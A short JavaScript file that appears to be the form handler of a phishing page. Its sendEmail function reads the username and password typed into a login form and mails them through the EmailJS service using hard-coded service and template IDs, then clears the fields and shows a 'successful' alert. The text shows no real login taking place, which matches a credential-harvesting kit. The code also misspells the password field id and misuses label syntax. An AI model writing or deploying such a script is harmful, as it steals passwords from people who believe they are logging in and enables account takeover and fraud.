"use strict";
function sendEmail() {
  const params = {
    username: document.getElementById("username").value,
    password: document.getElementById("passsword").value,
  };
  const serviceID = "service_4zmio4z";
  const templateID = "template_goa7aed";

  emailjs
    .send(serviceID, templateID, params)
    .then((res) => {
      username: document.getElementById("username").value = "";
      password: document.getElementById("passsword").value = "";
      console.log(res);
      alert("successful");
    })
    .catch((err) => console.log(err));
}
